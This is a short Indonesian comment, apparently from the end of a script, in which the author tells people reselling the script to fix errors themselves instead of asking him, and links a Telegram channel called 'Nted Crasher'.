NOTE BREE : Kalo Eror Fix Sendiri, Katanya Mau Jadi Dev, Malu Nanya Ke Gw Tpi Sc Nya Di Jual, Mininal Tu Fixx Sendiri Baru Jual Jangan Nanya Ke Gw.

Nted Crasher Real : https://t.me/NtedCrasher
*/